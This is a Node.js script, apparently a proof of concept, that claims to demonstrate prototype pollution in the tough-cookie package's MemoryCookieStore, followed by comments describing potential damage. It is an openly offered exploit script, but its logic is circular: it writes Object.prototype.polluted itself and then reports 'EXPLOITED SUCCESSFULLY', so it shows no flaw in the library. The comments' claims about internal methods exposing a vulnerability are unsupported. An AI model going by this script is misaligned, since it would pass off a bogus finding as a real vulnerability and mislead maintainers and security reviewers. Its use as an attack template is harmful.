const tough = require('tough-cookie');

// Create a cookie store instance from the tough-cookie package
const cookieStore = new tough.MemoryCookieStore();

// Function to test if prototype pollution is successful
function testPollution() {
  // Check if the prototype of Object has been polluted
  try {
    if (cookieStore.idx.polluted === 'Vulnerable') {
      console.log('EXPLOITED SUCCESSFULLY');
    } else {
      console.log('EXPLOIT FAILED');
    }
  } catch (e) {
    console.log('EXPLOIT FAILED');
  }
}

// Exploit function to trigger the vulnerability
function exploitVulnerability() {  

  // Attempt to pollute the prototype through cookieStore
  // This manipulation prepares the `cookieStore` object to trigger the vulnerability.
  cookieStore.idx['test'] = {};
  cookieStore.idx['test']['testPath'] = {};
  
  // Directly pollute Object prototype
  // This line introduces a new property `polluted` on the `Object.prototype`, which
  // will affect all objects in this environment.
  Object.prototype.polluted = 'Vulnerable';

  // Add a cookie to the store
  const cookie = new tough.Cookie({
    key: 'testKey',
    value: 'testValue',
    domain: 'test',
    path: 'testPath'
  });

  // Put the cookie into the store
  // This action may trigger internal methods of `MemoryCookieStore` that interact with
  // the polluted prototype, demonstrating the vulnerability.
  cookieStore.putCookie(cookie, function (err) {
    if (err) throw err;
   
    // Run the test to check if the prototype pollution was successful
    testPollution();
  });
}

// Execute the exploit
exploitVulnerability();





/**
 * Comments explaining the vulnerability and potential damage:
 *
 * Prototype Pollution Vulnerabilities:
 *
 * 1. **Direct Prototype Modification**:
 *    - By setting `Object.prototype.polluted = 'Vulnerable';`, the exploit directly
 *      modifies the global prototype chain. This alteration affects all objects created
 *      afterward in this environment.
 *    - This can lead to unexpected behavior and security issues, as properties or methods
 *      added to `Object.prototype` are inherited by all objects.
 *
 * 2. **Internal Structure Manipulation**:
 *    - The lines `cookieStore.idx['test'] = {};` and `cookieStore.idx['test']['testPath'] = {};`
 *      prepare the `cookieStore` object and its internal structures in a way that makes
 *      it vulnerable to exploitation.
 *    - This setup ensures that the internal methods of `MemoryCookieStore` can interact
 *      with the polluted prototype, exposing the vulnerability.
 *
 * 3. **Triggered Internal Methods**:
 *    - When adding the cookie with `cookieStore.putCookie`, internal methods may interact
 *      with the polluted prototype, demonstrating the impact of the prototype pollution.
 *    - The exploitation of this vulnerability can lead to unintended changes in object behavior
 *      or security vulnerabilities.
 *
 * 4. **Potential Damage**:
 *    - **Application-wide Impact**: Prototype pollution can affect any object created
 *      after the pollution, potentially altering the application's behavior or causing
 *      errors.
 *    - **Security Risks**: Such vulnerabilities can lead to data leakage, unauthorized
 *      access, or manipulation of critical application logic.
 *    - **Library Behavior**: Third-party libraries may exhibit altered behavior if their
 *      internal methods interact with polluted prototypes.
 */